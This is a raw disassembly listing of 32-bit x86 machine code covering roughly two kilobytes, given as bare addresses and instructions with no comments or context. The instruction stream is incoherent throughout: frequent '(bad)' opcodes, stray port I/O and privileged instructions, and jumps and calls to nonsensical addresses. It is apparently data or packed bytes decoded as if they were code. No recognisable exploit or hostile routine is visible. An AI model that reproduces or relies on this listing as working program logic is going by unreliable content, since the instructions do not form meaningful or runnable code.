  40ed96:	aas    
  40ed97:	in     eax,0x7d
  40ed99:	ret    0x8b
  40ed9c:	lock mov edi,DWORD PTR [ebp-0x18]
  40eda0:	and    edi,edi
  40eda2:	mov    edi,edi
  40eda4:	call   0xe40eee80
  40eda9:	push   es
  40edaa:	add    al,ch
  40edac:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40edb3:	(bad)  
  40edb4:	hlt    
  40edb5:	add    eax,0xffd3e87d
  40edba:	cmp    bh,0x8
  40edbd:	(bad)  
  40edbe:	fld    DWORD PTR [esi]
  40edc0:	out    dx,al
  40edc1:	call   0xff9fecc9
  40edc6:	cmp    al,0x46
  40edc8:	shr    esp,0x8
  40edcb:	(bad)  
  40edcc:	pop    es
  40edcd:	fisttp QWORD PTR [ebp+0xe577eff]
  40edd3:	push   ebx
  40edd4:	add    BYTE PTR [ebx+0x24008b56],cl
  40edda:	add    BYTE PTR [ebp+0x50],al
  40eddd:	push   eax
  40edde:	add    DWORD PTR [ebx+0x757d1834],ecx
  40ede4:	sub    edx,DWORD PTR [esi-0x24]
  40ede7:	jne    0x40ed9f
  40ede9:	lods   eax,DWORD PTR ds:[esi]
  40edea:	mov    edx,DWORD PTR [edx-0x34]
  40eded:	dec    esi
  40edee:	out    0x83,eax
  40edf0:	into   
  40edf1:	push   edi
  40edf3:	loopne 0x40edc3
  40edf5:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40edf9:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ee00:	rol    DWORD PTR [edx],0x8
  40ee03:	mov    esp,ecx
  40ee05:	cmp    DWORD PTR [ebx],0xc
  40ee08:	mov    esi,0x5001c0
  40ee0d:	push   eax
  40ee0e:	push   cs
  40ee0f:	push   eax
  40ee10:	(bad)  
  40ee11:	sub    edx,edi
  40ee13:	push   esi
  40ee14:	adc    al,0xcb
  40ee16:	ins    DWORD PTR es:[edi],dx
  40ee17:	mov    eax,0x203e8
  40ee1c:	add    al,ah
  40ee1e:	inc    esi
  40ee1f:	mov    al,ch
  40ee21:	pop    es
  40ee22:	add    DWORD PTR [eax],0x1
  40ee25:	add    dh,al
  40ee27:	add    ah,ch
  40ee29:	rol    DWORD PTR [edx-0xd],1
  40ee2c:	cli    
  40ee2d:	push   0x4a
  40ee2f:	pop    ecx
  40ee30:	retf   0xfe6
  40ee33:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ee39:	(bad)  
  40ee3a:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ee40:	(bad)  
  40ee41:	sub    ebp,DWORD PTR [ebx]
  40ee43:	and    al,0x52
  40ee45:	(bad)  
  40ee46:	dec    edi
  40ee47:	inc    ebp
  40ee48:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ee4f:	add    BYTE PTR [ebp-0x7b],dh
  40ee52:	pop    eax
  40ee53:	add    BYTE PTR [edx+0x0],bl
  40ee56:	pop    edx
  40ee57:	dec    ebp
  40ee58:	jmp    DWORD PTR [ebx]
  40ee5a:	and    al,0xec
  40ee5c:	push   edx
  40ee5d:	out    0x64,eax
  40ee5f:	jmp    0xd3f2e464
  40ee64:	jmp    0x40eebe
  40ee66:	mov    al,0xfe
  40ee68:	dec    BYTE PTR [ebp-0x18fd8018]
  40ee6e:	add    BYTE PTR [esi+ebp*1],bh
  40ee71:	pop    edx
  40ee72:	icebp  
  40ee73:	mov    eax,cs
  40ee75:	ins    BYTE PTR es:[edi],dx
  40ee76:	adc    eax,0x75510000
  40ee7b:	mov    esi,0x70158
  40ee80:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ee86:	mov    edi,esp
  40ee88:	cld    
  40ee89:	jge    0x40ef00
  40ee8b:	(bad)  
  40ee8d:	aas    
  40ee8e:	and    al,0x6d
  40ee90:	adc    cl,0x1
  40ee93:	mov    eax,DWORD PTR [eax]
  40ee95:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ee9b:	dec    ebp
  40ee9c:	add    eax,ebp
  40ee9e:	add    BYTE PTR [edx],al
  40eea0:	fadd   DWORD PTR [eax]
  40eea2:	stc    
  40eea3:	enter  0xee00,0x8b
  40eea7:	sbb    eax,0x1
  40eeaa:	sbb    esi,ecx
  40eeac:	in     al,0x0
  40eeae:	in     eax,dx
  40eeaf:	add    BYTE PTR [eax],al
  40eeb1:	jne    0x40ee3e
  40eeb3:	cmp    edx,esp
  40eeb5:	jb     0x40eec0
  40eeb7:	jmp    0x40ef2e
  40eeb9:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eebf:	add    BYTE PTR [ebx+0x4d83d840],cl
  40eec5:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40eecb:	jb     0x40ee56
  40eecd:	pop    edx
  40eece:	fadd   QWORD PTR [ebx-0x7445faa1]
  40eed4:	or     dh,BYTE PTR [edx+0x0]
  40eed7:	inc    edx
  40eed8:	or     dl,bh
  40eeda:	xlat   BYTE PTR ds:[ebx]
  40eedb:	dec    edx
  40eedc:	push   edi
  40eedd:	add    al,0x7
  40eedf:	leave  
  40eee0:	rol    DWORD PTR [edx+eax*1],0x7
  40eee4:	add    ecx,ecx
  40eee6:	mov    edx,ecx
  40eee8:	int3   
  40eee9:	jmp    0x40eea9
  40eeeb:	mov    al,0x0
  40eeed:	(bad)  
  40eeee:	jne    0x40eed8
  40eef0:	mov    eax,DWORD PTR [edx]
  40eef2:	call   0xc1556bf7
  40eef7:	pop    edi
  40eef8:	add    ebx,DWORD PTR [ecx-0x37]
  40eefb:	pop    ecx
  40eefc:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40ef03:	push   es
  40ef04:	mov    eax,DWORD PTR [eax]
  40ef06:	int3   
  40ef07:	add    ch,al
  40ef09:	jae    0x40eef3
  40ef0b:	int    0x1
  40ef0d:	enter  0x3000,0x18
  40ef11:	add    BYTE PTR [ebp+0x75],al
  40ef14:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ef1a:	push   0x2
  40ef1c:	pop    ecx
  40ef1d:	add    BYTE PTR [eax],cl
  40ef1f:	push   ebx
  40ef20:	lea    edi,[edi+eax*2]
  40ef23:	mov    al,0x1
  40ef25:	jb     0x40ef27
  40ef27:	mov    al,0x10
  40ef29:	push   eax
  40ef2a:	add    al,0x75
  40ef2c:	add    BYTE PTR [ebx],ch
  40ef2e:	add    ebx,esp
  40ef30:	int3   
  40ef31:	jne    0x40ef43
  40ef33:	movsx  edx,cl
  40ef36:	add    DWORD PTR [eax],eax
  40ef38:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ef3f:	mov    gs,edi
  40ef41:	add    BYTE PTR [eax-0x50],ch
  40ef44:	add    al,ch
  40ef46:	mov    eax,DWORD PTR [ecx]
  40ef48:	sub    eax,DWORD PTR [eax]
  40ef4a:	jb     0x40efc1
  40ef4c:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ef50:	jge    0x40ef3a
  40ef52:	add    al,0x1
  40ef54:	add    DWORD PTR [eax],0x0
  40ef57:	jne    0x40ef59
  40ef59:	je     0x40efa0
  40ef5b:	mov    eax,DWORD PTR [edi]
  40ef5d:	ror    BYTE PTR [ebp+0x4d],1
  40ef60:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ef67:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ef6d:	mov    DWORD PTR [ebx],ebp
  40ef6f:	fadd   DWORD PTR [eax+0x75]
  40ef72:	inc    eax
  40ef73:	pop    eax
  40ef74:	lea    ebx,[ecx+0x4f]
  40ef77:	push   0xb1000003
  40ef7c:	out    dx,eax
  40ef7d:	add    ebp,DWORD PTR [edx+edx*2]
  40ef80:	add    BYTE PTR [ebx+ecx*4],bh
  40ef83:	mov    ch,BYTE PTR [ebx]
  40ef85:	jb     0x40eff9
  40ef87:	add    al,0x89
  40ef89:	push   eax
  40ef8a:	call   0x84293cfc
  40ef8f:	add    DWORD PTR [eax+eax*1],eax
  40ef92:	jae    0x40efa8
  40ef94:	icebp  
  40ef95:	inc    ebp
  40ef96:	mov    eax,DWORD PTR gs:[ecx]
  40ef99:	int3   
  40ef9a:	out    dx,al
  40ef9b:	loopne 0x40efea
  40ef9d:	sub    eax,DWORD PTR [edx]
  40ef9f:	push   0xffffff83
  40efa1:	pop    esi
  40efa2:	push   cs
  40efa3:	jl     0x40efbe
  40efa5:	add    al,0xaf
  40efa7:	xor    eax,0x832b6d00
  40efac:	mov    eax,DWORD PTR [edx]
  40efae:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40efb4:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40efba:	inc    ebp
  40efbb:	shr    ebx,0x3
  40efbe:	or     DWORD PTR [eax],0x4
  40efc1:	push   0xffffffa5
  40efc3:	pop    esi
  40efc4:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40efcb:	jmp    0x40f02a
  40efcd:	mov    edi,0xff0272
  40efd2:	fdivr  QWORD PTR [ebp+0x5d]
  40efd5:	push   0x4e
  40efd7:	pop    ecx
  40efd8:	call   0x4133dd
  40efdd:	mov    DWORD PTR [ebx],eax
  40efdf:	in     al,0xc8
  40efe1:	rol    BYTE PTR [ebp-0x75],0xc1
  40efe5:	call   0xaaf1c6
  40efea:	pop    esi
  40efeb:	enter  0xceff,0x8b
  40efef:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eff3:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40effa:	je     0x40effc
  40effc:	or     DWORD PTR [ebx-0x74183b24],eax
  40f002:	jne    0x40efe8
  40f004:	jmp    0x40efff
  40f006:	push   DWORD PTR [edx-0x24]
  40f009:	push   0x4d
  40f00b:	pop    ecx
  40f00c:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40f010:	jge    0x40f018
  40f012:	mov    eax,eax
  40f014:	sub    ebp,DWORD PTR [edx+0x24]
  40f017:	pop    esi
  40f018:	inc    ebp
  40f019:	mov    esp,0x8b6077
  40f01e:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40f024:	lods   al,BYTE PTR ds:[esi]
  40f025:	add    BYTE PTR [ebx],bh
  40f027:	enter  0xce73,0x49
  40f02b:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40f033:	stc    
  40f034:	jge    0x40f0a8
  40f036:	jnp    0xdd407397
  40f03c:	call   0xc3f112
  40f041:	fadd   st(0),st
  40f043:	dec    esi
  40f044:	ins    BYTE PTR es:[edi],dx
  40f045:	stc    
  40f046:	cmp    al,0x73
  40f048:	push   ebp
  40f049:	mov    eax,0xf8028b
  40f04e:	jne    0x40f011
  40f050:	mov    esi,ecx
  40f052:	mov    esp,DWORD PTR [ebp+0x2c]
  40f055:	add    edi,DWORD PTR [ebp-0x24]
  40f058:	sub    esp,eax
  40f05a:	and    al,0x45
  40f05c:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40f062:	sbb    al,0xee
  40f064:	pop    esi
  40f065:	call   0x80f095
  40f06a:	fsubr  st,st(3)
  40f06c:	sti    
  40f06d:	add    BYTE PTR gs:[ecx],bh
  40f070:	add    eax,esp
  40f072:	add    DWORD PTR [esi],eax
  40f074:	rol    DWORD PTR [ebp+0x8],0x29
  40f078:	mov    esp,eax
  40f07a:	clc    
  40f07b:	jne    0x40f0f2
  40f07d:	mov    eax,0x8b0673
  40f082:	loopne 0x40f0c9
  40f084:	loopne 0x40f00f
  40f086:	lods   al,BYTE PTR ds:[esi]
  40f087:	int3   
  40f088:	inc    ebp
  40f089:	mov    DWORD PTR gs:[eax+edi*8],eax
  40f08d:	add    al,0xc3
  40f08f:	sub    ecx,DWORD PTR [ebp+0x47]
  40f092:	(bad)  
  40f094:	shr    BYTE PTR [ebp-0x1f],0xe8
  40f098:	add    eax,DWORD PTR [eax]
  40f09a:	call   0x642b19f
  40f09f:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40f0a5:	dec    esi
  40f0a6:	ins    DWORD PTR es:[edi],dx
  40f0a7:	in     al,dx
  40f0a8:	lea    eax,[eax]
  40f0aa:	inc    ebp
  40f0ab:	inc    ebp
  40f0ac:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40f0b2:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40f0bc:	and    al,0xdc
  40f0be:	ror    DWORD PTR [edx+0x24],0xf7
  40f0c2:	or     BYTE PTR [ebp+0x4c],dh
  40f0c5:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40f0c9:	stos   BYTE PTR es:[edi],al
  40f0ca:	adc    edx,edi
  40f0cc:	inc    esp
  40f0cd:	add    edi,DWORD PTR [eax]
  40f0cf:	jne    0x40f0b4
  40f0d1:	mov    DWORD PTR [eax-0x7449db04],ecx
  40f0d7:	cmp    ecx,DWORD PTR [edi]
  40f0d9:	sub    BYTE PTR [ebp-0x7e],dl
  40f0dc:	sar    ebp,0xb
  40f0df:	jmp    FWORD PTR [edi+0x2400392a]
  40f0e5:	sub    esi,DWORD PTR [ebx-0x73]
  40f0e8:	mov    esp,DWORD PTR [ecx+edi*4]
  40f0eb:	mov    ecx,DWORD PTR [eax]
  40f0ed:	and    BYTE PTR [eax],al
  40f0ef:	jne    0x40f0bb
  40f0f1:	sub    ebp,ecx
  40f0f3:	sbb    BYTE PTR [esi+0x32],ah
  40f0f6:	dec    ebp
  40f0f7:	push   ebp
  40f0f8:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40f0fe:	ret    
  40f0ff:	mov    edx,ebp
  40f101:	leave  
  40f102:	sub    DWORD PTR [esi+0x24],ebx
  40f105:	ret    0x2b
  40f108:	pop    ax
  40f10a:	push   ebp
  40f10b:	rol    BYTE PTR [ebx],0xeb
  40f10e:	add    DWORD PTR [ecx+0x6c0001],0x40
  40f115:	jb     0x40f16c
  40f117:	ret    
  40f118:	in     al,dx
  40f119:	jecxz  0x40f0a6
  40f11b:	push   esi
  40f11c:	xchg   esp,eax
  40f11d:	jne    0x40f11f
  40f11f:	cmp    edx,DWORD PTR [esi+0x1c]
  40f122:	jne    0x40f108
  40f124:	mov    eax,DWORD PTR [ebp-0x77]
  40f127:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f12e:	mov    esi,DWORD PTR [ebp-0x75]
  40f131:	pop    esi
  40f132:	nop
  40f133:	mov    eax,DWORD PTR [eax]
  40f135:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f13b:	add    al,0x0
  40f13d:	inc    ebp
  40f13e:	mov    eax,DWORD PTR [ebx]
  40f140:	mov    ebp,ebx
  40f142:	cmp    al,0xf
  40f144:	or     al,al
  40f146:	inc    ebp
  40f147:	inc    ebp
  40f148:	xor    eax,0x8bc89c8b
  40f14d:	ins    BYTE PTR es:[edi],dx
  40f14e:	cld    
  40f14f:	add    BYTE PTR [edi+0x566c16c0],dh
  40f155:	add    BYTE PTR [ecx-0x5],dl
  40f158:	add    eax,0x17200
  40f15d:	sbb    al,0x85
  40f15f:	dec    esp
  40f160:	je     0x40f19a
  40f162:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f166:	add    BYTE PTR [ebx],bh
  40f168:	(bad)  
  40f169:	and    al,0x32
  40f16b:	jae    0x40f109
  40f16d:	mov    cl,cl
  40f16f:	inc    DWORD PTR [esp]
  40f172:	push   ebp
  40f173:	shr    esp,0x8
  40f176:	in     al,dx
  40f177:	push   esp
  40f178:	add    DWORD PTR [eax],esp
  40f17a:	add    bl,cl
  40f17c:	inc    ebp
  40f17d:	mov    bh,0x53
  40f17f:	add    BYTE PTR [ebp-0x17],al
  40f182:	push   esi
  40f183:	cmovne ecx,edx
  40f186:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f18a:	push   edi
  40f18b:	pop    ss
  40f18c:	xor    eax,0x89009cd9
  40f191:	add    ah,bh
  40f193:	sub    eax,DWORD PTR [ebp-0x3f]
  40f196:	aad    0x5
  40f198:	inc    ebp
  40f199:	add    edx,edx
  40f19b:	add    BYTE PTR [ebp-0x40],al
  40f19e:	xlat   BYTE PTR ds:[ebx]
  40f19f:	ins    BYTE PTR es:[edi],dx
  40f1a0:	inc    ebp
  40f1a1:	inc    eax
  40f1a2:	and    ecx,eax
  40f1a4:	dec    eax
  40f1a5:	add    eax,0x20204c45
  40f1aa:	inc    ebp
  40f1ab:	fnstcw WORD PTR [esi+0x29]
  40f1ae:	leave  
  40f1af:	add    BYTE PTR [esi+0xc000c0],bh
  40f1b5:	lea    eax,[esp-0x34]
  40f1b9:	ret    
  40f1ba:	mov    dh,0x8b
  40f1bc:	xor    edx,DWORD PTR [ecx+0x3]
  40f1bf:	mov    al,BYTE PTR [ecx+0x1]
  40f1c2:	sbb    BYTE PTR [eax],al
  40f1c4:	stc    
  40f1c5:	mov    esi,DWORD PTR [edx+0x8]
  40f1c8:	(bad)  
  40f1c9:	les    esi,FWORD PTR ss:[ecx]
  40f1cc:	(bad)  
  40f1cd:	mov    al,ch
  40f1cf:	add    esi,eax
  40f1d1:	add    dh,al
  40f1d3:	or     esi,eax
  40f1d5:	mov    dl,0xc7
  40f1d7:	add    esi,eax
  40f1d9:	add    al,cl
  40f1db:	push   cs
  40f1dc:	mov    BYTE PTR [edx+0xc601c9],0xca
  40f1e3:	or     BYTE PTR [ebx],dh
  40f1e5:	dec    ecx
  40f1e6:	lea    eax,[ebx]
  40f1e8:	or     eax,0x18fc0fc7
  40f1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ee:	(bad)  
  40f1f0:	fiadd  WORD PTR [ebp-0x78]
  40f1f3:	jae    0xed75f942
  40f1f9:	or     BYTE PTR [ebp+0x7],al
  40f1fc:	loope  0x40f19b
  40f1fe:	inc    ebp
  40f1ff:	xor    dl,dh
  40f201:	pop    esi
  40f202:	inc    ebp
  40f203:	shr    edx,0xc
  40f206:	inc    ebp
  40f207:	and    ch,0x1
  40f20a:	inc    ebp
  40f20b:	add    bh,bl
  40f20d:	add    BYTE PTR [ebp-0x7b],al
  40f210:	out    dx,al
  40f211:	clc    
  40f212:	inc    ebp
  40f213:	ret    0xd7
  40f216:	inc    ebp
  40f217:	mov    edi,DWORD PTR [esi-0x7f]
  40f21a:	leave  
  40f21b:	sub    al,0x44
  40f21d:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  40f224:	add    ebx,DWORD PTR [ecx+eax*2]
  40f227:	(bad)  
  40f228:	sbb    al,ah
  40f22a:	stc    
  40f22b:	test   DWORD PTR [edx-0x8],esi
  40f22e:	lea    edi,[edi-0x7007aa4]
  40f234:	mov    DWORD PTR [ebp-0x24],edi
  40f237:	(bad)  
  40f238:	dec    ebp
  40f239:	int3   
  40f23a:	mov    eax,0x71cdfcc6
  40f23f:	mov    BYTE PTR [ecx],0xce
  40f242:	(bad)  
  40f243:	(bad)  
  40f244:	dec    edi
  40f246:	jmp    FWORD PTR [edx-0x38]
  40f249:	(bad)  
  40f24a:	or     dl,al
  40f24c:	jge    0x40f214
  40f24e:	(bad)  
  40f24f:	shl    esp,1
  40f251:	xor    eax,DWORD PTR [ebp+0x45caf85a]
  40f257:	add    BYTE PTR [ebx+0xd8c8d],cl
  40f25d:	rdpmc  
  40f25f:	sbb    BYTE PTR [edi+0x7de08da],bh
  40f265:	mov    BYTE PTR [ebp+0x39063283],bl
  40f26b:	in     eax,dx
  40f26c:	cmovne ebx,DWORD PTR [edx]
  40f26f:	jecxz  0x40f271
  40f271:	inc    ebp
  40f272:	mov    esp,ecx
  40f274:	sbb    al,0x45
  40f276:	mov    ebx,edx
  40f278:	add    DWORD PTR [ebp+0x0],eax
  40f27b:	loopne 0x40f27e
  40f27d:	inc    ebp
  40f27e:	dec    ebp
  40f27f:	and    DWORD PTR [ebx+0x208045],ecx
  40f285:	inc    ebp
  40f286:	mov    DWORD PTR [esi+0x6a],edi
  40f289:	leave  
  40f28a:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d6
  40f292:	inc    ebp
  40f293:	add    ebx,edi
  40f295:	inc    ecx
  40f296:	xlat   BYTE PTR ds:[ebx]
  40f297:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  40f29d:	(bad)  
  40f29e:	xor    bh,BYTE PTR [eax+eax*4+0x8bd36c6]
  40f2a5:	(bad)  
  40f2a6:	dec    esi
  40f2a7:	mov    esi,0xbf45c6f3
  40f2ac:	mov    esi,eax
  40f2ae:	fadd   st,st(0)
  40f2b0:	inc    esi
  40f2b2:	(bad)  
  40f2b3:	rcl    esp,0xc6
  40f2b6:	inc    edx
  40f2b8:	push   eax
  40f2b9:	mov    BYTE PTR [ebp-0x3d],0x33
  40f2bd:	xor    eax,DWORD PTR [ebx]
  40f2bf:	lea    edx,[eax+0xd]
  40f2c2:	inc    ebp
  40f2c3:	jae    0x8c1b58e1
  40f2c9:	ficomp WORD PTR [eax+ecx*4]
  40f2cc:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f2d3:	test   esi,edi
  40f2d5:	(bad)  
  40f2d6:	(bad)  
  40f2d7:	inc    DWORD PTR [eax]
  40f2d9:	inc    ebp
  40f2da:	add    BYTE PTR [ebx-0x10aa23d0],cl
  40f2e0:	mov    edx,DWORD PTR [ebx]
  40f2e2:	cld    
  40f2e3:	mov    edi,ecx
  40f2e5:	mov    ecx,ebx
  40f2e7:	pop    esp
  40f2e8:	sar    edi,0x1e
  40f2eb:	cmp    ebp,esp
  40f2ed:	jne    0x40f362
  40f2ef:	mov    DWORD PTR ds:0x22450be4,ecx
  40f2f5:	loopne 0x40f2e3
  40f2f7:	pushf  
  40f2f8:	jae    0x40f285
  40f2fa:	add    eax,0x3388e91c
  40f2ff:	add    esp,ebp
  40f301:	add    BYTE PTR [ebx-0x40],dh
  40f304:	jmp    0x91f35f
  40f309:	mov    ebx,0x6a7275
  40f30e:	pop    ecx
  40f30f:	add    DWORD PTR [ebp+eax*4-0x77],esi
  40f313:	add    bh,BYTE PTR [eax+0x0]
  40f316:	dec    DWORD PTR [ebp+0x66]
  40f319:	mov    ecx,DWORD PTR [ebp-0xff0084]
  40f31f:	mov    DWORD PTR [edx-0x75],ebp
  40f322:	data16 sbb al,0x8d
  40f325:	mov    edi,edi
  40f327:	add    edi,edi
  40f329:	add    BYTE PTR [edx+0x1],ch
  40f32c:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  40f333:	jmp    0xee6a:0xd84dc766
  40f33a:	pop    ecx
  40f33b:	jle    0x40f2c6
  40f33d:	inc    ebp
  40f33e:	sbb    BYTE PTR [esi-0x37],0x8
  40f342:	test   edx,ecx
  40f344:	(bad)  
  40f345:	jmp    0x41017c49
  40f34a:	push   ebp
  40f34b:	jne    0x40f3b3
  40f34d:	lea    ecx,[ebp-0x2c]
  40f350:	mov    DWORD PTR [ebp-0x200158],0xfe4585d6
  40f35a:	sar    bh,0xeb
  40f35d:	mov    eax,edi
  40f35f:	loopne 0x40f311
  40f361:	(bad)  
  40f362:	rol    ebx,cl
  40f364:	jmp    0xe9c0:0xdf1c458b
  40f36b:	push   eax
  40f36c:	inc    bp
  40f36e:	inc    ebp
  40f36f:	mov    eax,ebp
  40f371:	cwde   
  40f372:	mov    DWORD PTR [eax],0xd4ffc7d4
  40f378:	add    bh,bh
  40f37a:	add    BYTE PTR [ecx],al
  40f37c:	call   0x1400b81
  40f381:	inc    DWORD PTR [ebp-0xb201f8]
  40f387:	xor    eax,DWORD PTR [ebp-0xc401fd]
  40f38d:	jne    0x40f31a
  40f38f:	mov    eax,ds:0x33c70be0
  40f394:	ret    
  40f395:	out    dx,eax
  40f396:	mov    edx,DWORD PTR ds:0xbc0a31c
  40f39c:	push   eax
  40f39d:	xor    eax,DWORD PTR [ebp-0x71]
  40f3a0:	mov    esi,DWORD PTR [edx-0x68]
  40f3a3:	mov    ds:0x33ff0b00,eax
  40f3a8:	(bad)  
  40f3a9:	mov    ecx,0x8b8d0008
  40f3ae:	call   FWORD PTR [edi+edi*8]
  40f3b1:	and    bh,bh
  40f3b3:	push   0x66
  40f3b5:	mov    bp,0xff8d
  40f3b9:	(bad)  
  40f3ba:	(bad)  
  40f3bb:	dec    DWORD PTR [edi]
  40f3bd:	mov    DWORD PTR [edx],eax
  40f3bf:	jp     0x40f3c1
  40f3c1:	(bad)  
  40f3c2:	mov    ecx,0x774f59
  40f3c7:	mov    ecx,eax
  40f3c9:	jl     0x40f354
  40f3cb:	dec    DWORD PTR [eax-0x74c73fa7]
  40f3d1:	mov    DWORD PTR [esi+0x7e],esp
  40f3d4:	push   ebp
  40f3d5:	dec    DWORD PTR [ebp-0x7676f2a7]
  40f3db:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  40f3e3:	xor    ecx,DWORD PTR [ebp-0x7627e877]
  40f3e9:	call   DWORD PTR [eax+0x668dc233]
  40f3ef:	test   al,0x55
  40f3f1:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  40f3f7:	into   
  40f3f8:	xchg   esp,eax
  40f3f9:	loop   0x40f384
  40f3fb:	(bad)  
  40f3fc:	xchg   esi,eax
  40f3fd:	lods   al,BYTE PTR ds:[esi]
  40f3fe:	ret    0x8bd3
  40f401:	in     eax,dx
  40f402:	inc    bp
  40f404:	dec    ebp
  40f405:	in     al,0xb9
  40f407:	xor    BYTE PTR [edi-0x39],cl
  40f40a:	add    BYTE PTR [ecx+esi*8+0x64e189ec],dh
  40f411:	(bad)  
  40f412:	(bad)  
  40f413:	mov    eax,0x85667e8b
  40f418:	mov    ch,0xfe
  40f41a:	(bad)  
  40f41b:	(bad)  
  40f41c:	inc    DWORD PTR [eax]
  40f41e:	jno    0x40f420
  40f420:	data16 mov bl,0xb5
  40f423:	add    bh,bh
  40f425:	mov    edi,edi
  40f427:	fmul   QWORD PTR [ecx-0x729501]
  40f42d:	aam    0x8d
  40f42f:	call   edi
  40f431:	push   eax
  40f432:	mov    DWORD PTR [ebp+0x6c],eax
  40f435:	xor    edi,edi
  40f437:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  40f43d:	sub    DWORD PTR [esi+0x44],0xffffffff
  40f441:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  40f447:	add    DWORD PTR [eax+0x0],esi
  40f44a:	push   DWORD PTR [eax]
  40f44c:	push   bp
  40f44e:	lea    ecx,[ebp-0x8701]
  40f454:	mov    DWORD PTR [ecx+0x74],edx
  40f457:	sar    bh,1
  40f459:	or     DWORD PTR [ebx-0x48000386],0x77
  40f460:	fs test edi,edi
  40f463:	add    al,0x33
  40f465:	add    BYTE PTR [ebx],al
  40f467:	adc    dh,BYTE PTR [ebx]
  40f469:	add    BYTE PTR [esi-0x75],ah
  40f46c:	test   DWORD PTR [esi-0x1],esp
  40f46f:	inc    ebp
  40f470:	inc    DWORD PTR [ebx-0x2ff00abb]
  40f476:	dec    ebp
  40f477:	mov    DWORD PTR [ebx],esi
  40f479:	mov    al,BYTE PTR [ebx]
  40f47b:	push   ecx
  40f47c:	xor    esp,DWORD PTR [esi+0x66]
  40f47f:	push   ebp
  40f480:	inc    ebp
  40f481:	xor    DWORD PTR [ebx],0x8
  40f484:	mov    WORD PTR [ebp-0x72],ax
  40f488:	push   cx
  40f48a:	inc    ebp
  40f48b:	adc    WORD PTR [ebp-0x64],0xff83
  40f490:	mov    DWORD PTR [ebx],0x92b589f8
  40f496:	clc    
  40f497:	push   ecx
  40f498:	inc    ebp
  40f499:	data16 cmc 
  40f49b:	push   ebp
  40f49c:	pushf  
  40f49d:	data16 (bad) 
  40f49f:	dec    ebp
  40f4a0:	in     al,0x83
  40f4a2:	test   DWORD PTR [edi-0x76ba3508],eax
  40f4a8:	xor    ebx,DWORD PTR [eax+0xc7329c]
  40f4ae:	in     al,0x8b
  40f4b0:	add    eax,0x45b5f866
  40f4b5:	dec    DWORD PTR [ebx+0xf094ff]
  40f4bb:	mov    DWORD PTR [ecx+0x45fff466],ecx
  40f4c1:	lea    ecx,[ebx-0x4e76e3b3]
  40f4c7:	push   0x6600ff01
  40f4cc:	push   cs
  40f4cd:	test   DWORD PTR [eax+0xff01ff],eax
  40f4d3:	inc    ecx
  40f4d4:	inc    ebp
  40f4d5:	mov    WORD PTR [ebp-0x360018],ax
  40f4dc:	push   cs
  40f4dd:	shl    BYTE PTR [ebp+0x66],0x8b
  40f4e1:	test   DWORD PTR [edi+edi*8],ebx
  40f4e4:	cs (bad) 
  40f4e6:	inc    DWORD PTR [ecx-0x75]
  40f4e9:	data16 in al,dx
  40f4eb:	test   DWORD PTR [eax],ecx
  40f4ed:	inc    DWORD PTR [eax]
  40f4ef:	inc    DWORD PTR [ecx-0x77]
  40f4f2:	mov    esi,DWORD PTR [edx-0x77]
  40f4f5:	call   FWORD PTR [eax]
  40f4f7:	leavew 
  40f4f9:	xchg   ebp,eax
  40f4fa:	inc    edi
  40f4fb:	push   DWORD PTR [ebp-0x1]
  40f4fe:	call   0xff50e048
  40f503:	lea    eax,[ebp-0x1]
  40f506:	mov    edi,edi
  40f508:	enter  0xc7,0xc3
  40f50c:	mov    eax,ecx
  40f50e:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  40f514:	sbb    al,0x8b
  40f516:	sbb    esp,edi
  40f518:	dec    ebp
  40f519:	mov    bh,0x8b
  40f51b:	mov    ah,cl
  40f51d:	mov    DWORD PTR [eax],0x8bc1ffc3
  40f523:	mov    eax,ebx
  40f525:	mov    BYTE PTR [eax],al
  40f527:	sar    bh,0x89
  40f52a:	sub    BYTE PTR [eax-0x77ff766c],cl
  40f530:	mov    esp,DWORD PTR [ebp+0x7c]
  40f533:	add    BYTE PTR [eax],al
  40f535:	inc    ebp
  40f536:	mov    esi,DWORD PTR ds:0xc7049c8d
  40f53c:	or     ah,bl
